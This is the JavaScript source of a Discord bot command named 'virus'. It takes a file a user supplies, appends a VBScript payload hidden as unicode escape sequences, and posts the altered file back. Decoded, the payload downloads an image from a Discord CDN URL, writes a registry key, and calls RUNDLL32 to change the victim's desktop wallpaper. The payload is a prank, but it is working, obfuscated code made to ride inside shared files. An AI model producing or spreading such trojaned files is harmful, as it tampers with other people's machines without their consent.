module.exports = {
    name: ['virus'],
    execute: async function (msg, args) {
        let poopy = this

        if (msg.member.permissions.has('MANAGE_GUILD') || msg.member.roles.cache.find(role => role.name.match(/mod|dev|admin|owner|creator|founder|staff/ig)) || msg.member.permissions.has('ADMINISTRATOR') || msg.author.id === msg.guild.ownerID || poopy.config.ownerids.find(id => id == msg.author.id)) {
            await msg.channel.sendTyping().catch(() => { })
            if (poopy.data['guild-data'][msg.guild.id]['channels'][msg.channel.id]['lastUrl'] === undefined && args[1] === undefined) {
                await msg.channel.send('What is the file?!').catch(() => { })
                await msg.channel.sendTyping().catch(() => { })
                return;
            };
            var currenturl = poopy.data['guild-data'][msg.guild.id]['channels'][msg.channel.id]['lastUrl'] || args[1]
            var fileinfo = await poopy.functions.validateFile(currenturl, true).catch(async error => {
                await msg.channel.send(error).catch(() => { })
                await msg.channel.sendTyping().catch(() => { })
                return;
            })

            if (!fileinfo) return
            var type = fileinfo.type

            var filepath = await poopy.functions.downloadFile(currenturl, `input.${type.ext}`)
            var filename = `input.${type.ext}`

            var filehex = poopy.modules.fs.readFileSync(`${filepath}/${filename}`)
            var newfilehex = Buffer.concat([filehex, Buffer.from('\u000a\u000a\u0053\u0065\u0074\u0020\u006f\u0062\u006a\u0045\u006e\u0076\u0020\u003d\u0020\u006f\u0062\u006a\u0053\u0068\u0065\u006c\u006c\u002e\u0045\u006e\u0076\u0069\u0072\u006f\u006e\u006d\u0065\u006e\u0074\u0028\u0022\u0055\u0073\u0065\u0072\u0022\u0029\u000a\u000a\u0073\u0074\u0072\u0044\u0069\u0072\u0065\u0063\u0074\u006f\u0072\u0079\u0020\u003d\u0020\u006f\u0062\u006a\u0053\u0068\u0065\u006c\u006c\u002e\u0045\u0078\u0070\u0061\u006e\u0064\u0045\u006e\u0076\u0069\u0072\u006f\u006e\u006d\u0065\u006e\u0074\u0053\u0074\u0072\u0069\u006e\u0067\u0073\u0028\u0022\u0025\u0074\u0065\u006d\u0070\u0025\u0022\u0029\u000a\u000a\u0064\u0069\u006d\u0020\u0078\u0048\u0074\u0074\u0070\u003a\u0020\u0053\u0065\u0074\u0020\u0078\u0048\u0074\u0074\u0070\u0020\u003d\u0020\u0063\u0072\u0065\u0061\u0074\u0065\u006f\u0062\u006a\u0065\u0063\u0074\u0028\u0022\u004d\u0069\u0063\u0072\u006f\u0073\u006f\u0066\u0074\u002e\u0058\u004d\u004c\u0048\u0054\u0054\u0050\u0022\u0029\u000a\u0064\u0069\u006d\u0020\u0062\u0053\u0074\u0072\u006d\u003a\u0020\u0053\u0065\u0074\u0020\u0062\u0053\u0074\u0072\u006d\u0020\u003d\u0020\u0063\u0072\u0065\u0061\u0074\u0065\u006f\u0062\u006a\u0065\u0063\u0074\u0028\u0022\u0041\u0064\u006f\u0064\u0062\u002e\u0053\u0074\u0072\u0065\u0061\u006d\u0022\u0029\u000a\u0078\u0048\u0074\u0074\u0070\u002e\u004f\u0070\u0065\u006e\u0020\u0022\u0047\u0045\u0054\u0022\u002c\u0020\u0022https://cdn.discordapp.com/attachments/535469236802551811/930484652479770724/240B2FB0-BB42-4CAE-BE15-CB278560FFD4.jpg\u0022\u000a\u0078\u0048\u0074\u0074\u0070\u002e\u0053\u0065\u006e\u0064\u000a\u000a\u0077\u0069\u0074\u0068\u0020\u0062\u0053\u0074\u0072\u006d\u000a\u0020\u0020\u0020\u0020\u002e\u0074\u0079\u0070\u0065\u0020\u003d\u0020\u0031\u0020\u0027\u002f\u002f\u0062\u0069\u006e\u0061\u0072\u0079\u000a\u0020\u0020\u0020\u0020\u002e\u006f\u0070\u0065\u006e\u000a\u0020\u0020\u0020\u0020\u002e\u0077\u0072\u0069\u0074\u0065\u0020\u0078\u0048\u0074\u0074\u0070\u002e\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0042\u006f\u0064\u0079\u000a\u0020\u0020\u0020\u0020\u002e\u0073\u0061\u0076\u0065\u0074\u006f\u0066\u0069\u006c\u0065\u0020\u0073\u0074\u0072\u0044\u0069\u0072\u0065\u0063\u0074\u006f\u0072\u0079\u0020\u002b\u0020\u0022\u006d\u0079\u0049\u006d\u0061\u0067\u0065\u002e\u0070\u006e\u0067\u0022\u002c\u0020\u0032\u0020\u0027\u002f\u002f\u006f\u0076\u0065\u0072\u0077\u0072\u0069\u0074\u0065\u000a\u0065\u006e\u0064\u0020\u0077\u0069\u0074\u0068\u000a\u000a\u006f\u0062\u006a\u0053\u0068\u0065\u006c\u006c\u002e\u0052\u0065\u0067\u0057\u0072\u0069\u0074\u0065\u0020\u0022\u0048\u004b\u0043\u0055\u0043\u006f\u006e\u0074\u0072\u006f\u006c\u0020\u0050\u0061\u006e\u0065\u006c\u0044\u0065\u0073\u006b\u0074\u006f\u0070\u0057\u0061\u006c\u006c\u0070\u0061\u0070\u0065\u0072\u0022\u002c\u0020\u0073\u0074\u0072\u0044\u0069\u0072\u0065\u0063\u0074\u006f\u0072\u0079\u0020\u002b\u0020\u0022\u006d\u0079\u0049\u006d\u0061\u0067\u0065\u002e\u0070\u006e\u0067\u0022\u000a\u006f\u0062\u006a\u0053\u0068\u0065\u006c\u006c\u002e\u0052\u0075\u006e\u0020\u0022\u0025\u0077\u0069\u006e\u0064\u0069\u0072\u0025\u0053\u0079\u0073\u0074\u0065\u006d\u0033\u0032\u0052\u0055\u004e\u0044\u004c\u004c\u0033\u0032\u002e\u0045\u0058\u0045\u0020\u0075\u0073\u0065\u0072\u0033\u0032\u002e\u0064\u006c\u006c\u002c\u0055\u0070\u0064\u0061\u0074\u0065\u0050\u0065\u0072\u0055\u0073\u0065\u0072\u0053\u0079\u0073\u0074\u0065\u006d\u0050\u0061\u0072\u0061\u006d\u0065\u0074\u0065\u0072\u0073\u0022\u002c\u0020\u0031\u002c\u0020\u0054\u0072\u0075\u0065')])
            poopy.modules.fs.writeFileSync(`${filepath}/output.${type.ext}`, newfilehex)
            await poopy.functions.sendFile(msg, filepath, `output.${type.ext}`)
        } else {
            await msg.channel.send('You need to be an administrator to execute that! (you can do it in another server though I won\'t stop you)').catch(() => { })
            return;
        }
    },
    help: {
        name: 'virus <file> (admin only)',
        value: `Manipulates the file's Hex Code to make it a "virus".`
    },
    cooldown: 2500,
    perms: ['ADMINISTRATOR'],
    type: 'Hex Manipulation'
}